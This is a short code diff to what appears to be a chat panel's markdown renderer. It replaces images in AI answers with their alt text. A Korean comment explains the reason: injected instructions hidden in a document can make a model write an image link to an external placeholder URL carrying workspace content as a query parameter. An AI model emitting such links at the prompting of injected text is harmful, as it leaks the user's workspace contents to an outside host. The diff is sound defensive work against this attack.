@@ -184,6 +184,9 @@ function MessageContent({
               </a>
             );
           },
+          // 답변 속 이미지는 불러오지 않는다: 문서에 숨긴 지시(프롬프트 인젝션)로 ![](https://외부/?d=내용) 을 쓰게 하면
+          // 이미지 요청만으로 워크스페이스 내용이 밖으로 샐 수 있다. 설명(alt)만 글자로 보여 준다.
+          img: ({ alt }) => <span className="ai-panel__img-placeholder">🖼 {alt?.trim() || "이미지"}</span>,
           // 넓은 표는 답변 칸 안에서 가로로 스크롤한다
           table: ({ children }) => (
             <div className="ai-panel__table">
